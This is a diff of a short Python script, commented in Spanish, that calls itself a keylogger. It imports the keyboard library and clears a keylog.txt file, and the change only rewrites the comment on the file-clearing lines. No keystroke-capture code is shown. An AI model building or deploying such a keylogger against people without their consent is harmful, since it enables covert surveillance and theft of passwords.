@@ -1,6 +1,6 @@
 # Importo la libreria necesario para el keylogger
 import keyboard
-# Creo un archivo de texto para guardar las teclas pulsadas o en el caso de que ya exista, lo vacio
+# Estas lineas hacen que el archivo de texto se limpie cada vez que se ejecute el programa ya que el argumento w es sobreescritura siempre que el archivo ya exista, si no, creará el archivo
 with open("keylog.txt", "w") as log_file:
     log_file.write("")
 # Creo una funcion que se encargara de guardar las teclas pulsadas en el archivo de texto
